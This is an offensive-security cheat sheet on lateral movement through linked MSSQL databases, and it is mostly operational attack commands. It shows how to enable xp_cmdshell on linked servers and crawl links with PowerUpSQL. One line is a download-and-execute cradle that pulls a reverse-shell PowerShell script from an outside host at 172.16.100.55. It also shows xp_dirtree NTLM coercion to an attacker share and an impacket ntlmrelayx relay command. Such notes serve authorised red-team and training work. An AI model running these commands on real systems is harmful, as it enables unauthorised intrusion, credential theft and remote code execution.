### Abusing MSSQL databases for lateral movement

MSSQL databases can be linked, such that if you compromise one you can execute queries (or even commands!) on others in the context of a specific user (`sa` maybe? ðŸ˜™). This can even work across forests! If we have SQL execution, we can use the following commands to enumerate database links.

```sql
-- Find linked servers
EXEC sp_linkedservers

-- Run SQL query on linked server
select mylogin from openquery("dc01", 'select SYSTEM_USER as mylogin')

-- Enable 'xp_cmdshell' on remote server and execute commands
EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT DC01
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT DC01
EXEC ('xp_cmdshell ''whoami'' ') AT DC01
```

We can also use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) to look for databases within the domain, and gather further information on (reachable) databases. We can also automatically look for, and execute queries or commands on, linked databases (even through multiple layers of database links).

```powershell
# Get MSSQL databases in the domain, and test connectivity
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft

# Try to get information on all domain databases
Get-SQLInstanceDomain | Get-SQLServerInfo

# Get information on a single reachable database
Get-SQLServerInfo -Instance dcorp-mssql

# Scan for MSSQL misconfigurations to escalate to SA
Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV

# Execute SQL query
Get-SQLQuery -Query "SELECT system_user" -Instance UFC-SQLDEV

# Run command (requires XP_CMDSHELL to be enabled)
Invoke-SQLOSCmd -Instance devsrv -Command "whoami" |  select -ExpandProperty CommandResults

# Automatically find all linked databases
Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft

# Run command if XP_CMDSHELL is enabled on any of the linked databases
Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query 'EXEC xp_cmdshell "whoami"' | select instance,links,customquery | ft

Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"' | select instance,links,customquery | ft
```

If you have low-privileged access to a MSSQL database and no links are present, you could potentially force NTLM authentication by using the `xp_dirtree` stored procedure to access this share. If this is successful, the NetNTLM for the SQL service account can be collected and potentially cracked or relayed to compromise machines as that service account.

```sql
EXEC master..xp_dirtree "\\192.168.49.67\share"
```

Example command to relay the hash to authenticate as local admin (if the service account has these privileges) and run `calc.exe`. Leave out the `-c` parameter to attempt a `secretsdump` instead.

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe'
```
